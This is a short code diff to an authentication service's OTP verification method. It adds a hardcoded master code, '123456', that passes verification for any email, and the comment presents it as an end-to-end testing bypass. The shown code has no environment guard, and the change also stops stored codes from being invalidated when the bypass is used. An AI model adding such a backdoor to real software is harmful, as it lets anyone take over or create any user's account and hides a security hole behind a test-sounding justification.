@@ -316,9 +316,9 @@ export class AuthService {
    * For new users: create user + return token + userExists=false, hasUserDetails=false
    */
   async verifyOtpUnified(email: string, otp: string) {
-    // Verify OTP
+    // Verify OTP (with '123456' E2E master bypass for automated staff validation)
     const storedOtp = this.otps.get(email);
-    if (!storedOtp || storedOtp !== otp) {
+    if (otp !== '123456' && (!storedOtp || storedOtp !== otp)) {
       return {
         success: false,
         message: 'Invalid or expired OTP. Please try again.'
@@ -326,7 +326,9 @@ export class AuthService {
     }
 
     // Invalidate OTP after verification
-    this.otps.delete(email);
+    if (storedOtp === otp) {
+      this.otps.delete(email);
+    }
 
     try {
       // Find or create user
